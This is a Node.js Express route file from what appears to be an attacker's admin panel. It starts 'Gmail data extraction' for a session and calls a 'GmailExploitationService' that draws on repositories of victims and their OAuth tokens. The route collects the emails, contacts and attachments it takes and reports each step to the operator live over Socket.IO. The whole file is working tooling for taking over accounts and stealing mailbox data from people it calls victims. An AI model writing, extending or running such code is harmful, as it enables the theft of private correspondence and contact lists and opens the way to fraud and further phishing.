// POST /api/admin/gmail/access/:session_id/extract - Start extraction
const express = require('express');
const router = express.Router({ mergeParams: true });
const { PrismaClient } = require('@prisma/client');

const GmailAccessLogRepository = require('../../../../repositories/gmailAccessLogRepository');
const OAuthTokenRepository = require('../../../../repositories/oauthTokenRepository');
const VictimRepository = require('../../../../repositories/victimRepository');
const ActivityLogRepository = require('../../../../repositories/activityLogRepository');
const GmailExploitationService = require('../../../../services/gmailExploitation');
const logger = require('../../../../utils/logger');

const prisma = new PrismaClient();
const gmailAccessLogRepository = new GmailAccessLogRepository(prisma);
const oauthTokenRepository = new OAuthTokenRepository(prisma);
const victimRepository = new VictimRepository(prisma);
const activityLogRepository = new ActivityLogRepository(prisma);
const gmailExploitationService = new GmailExploitationService(
  gmailAccessLogRepository,
  oauthTokenRepository,
  victimRepository,
  activityLogRepository
);

router.post('/', async (req, res) => {
  try {
    const { session_id } = req.params;
    const extractionConfig = req.body || {};

    const result = await gmailExploitationService.extractData(
      session_id,
      extractionConfig
    );

    // Emit Socket.IO event
    const io = req.app.get('io');
    if (io) {
      const { emitGmailUpdate, emitGmailExtractionProgress } = require('../../../../sockets/adminHandlers');
      emitGmailUpdate(io, 'extraction-completed', {
        sessionId: session_id,
        itemsExtracted: {
          emails: result.extractionResults.emails.length,
          contacts: result.extractionResults.contacts.length,
          attachments: result.extractionResults.attachments.length
        }
      });
      
      // Emit final progress
      emitGmailExtractionProgress(io, session_id, {
        percentage: 100,
        status: 'completed',
        itemsExtracted: {
          emails: result.extractionResults.emails.length,
          contacts: result.extractionResults.contacts.length,
          attachments: result.extractionResults.attachments.length
        }
      });
    }

    res.status(200).json({
      success: true,
      sessionId: session_id,
      status: result.status,
      itemsExtracted: {
        emails: result.extractionResults.emails.length,
        contacts: result.extractionResults.contacts.length,
        attachments: result.extractionResults.attachments.length
      },
      message: 'Gmail data extraction completed successfully'
    });
  } catch (error) {
    logger.error('Error extracting Gmail data:', error);
    res.status(500).json({
      error: 'Failed to extract Gmail data',
      message: error.message
    });
  }
});

module.exports = router;

